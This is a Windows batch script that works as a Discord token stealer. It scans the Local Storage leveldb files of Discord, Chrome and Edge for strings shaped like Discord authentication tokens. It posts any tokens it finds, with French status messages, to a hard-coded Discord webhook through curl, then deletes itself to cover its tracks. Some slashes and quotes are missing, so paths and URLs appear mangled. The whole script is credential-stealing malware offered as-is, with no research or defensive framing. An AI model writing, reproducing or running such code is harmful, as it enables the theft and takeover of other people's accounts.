@echo off
set webhook=httpsdiscord.comapiwebhooks1503511970345652236FFiGZNJFFazWBvmQbnhqbdTF4GqAU-96_1XoNRzzwkBt1WMOgrQNUUUcv_98_pBIaapR

set discord_path=%appdata%discordLocal Storageleveldb
set chrome_path=%localappdata%..LocalGoogleChromeUser DataDefaultLocal Storageleveldb
set edge_path=%LOCALAPPDATA%MicrosoftEdgeUser DataDefaultLocal Storageleveldb

set tokens=
for %%p in (%discord_path% %chrome_path% %edge_path%) do (
    if exist %%p (
        for %%f in (%%p.ldb %%p.log) do (
            for f delims= %%a in ('findstr r c[a-zA-Z0-9_-]{24}.[a-zA-Z0-9_-]{6}.[a-zA-Z0-9_-]{27} %%f 2^nul') do set tokens=%%a
        )
    )
)

if defined tokens (
    for f tokens= %%t in (%tokens%) do (
        curl -s -X POST %webhook% -H Content-Type applicationjson -d {contentToken trouvé %%t} nul
    )
) else (
    curl -s -X POST %webhook% -H Content-Type applicationjson -d {contentAucun token trouvé} nul

del f %~f0 nul 2&1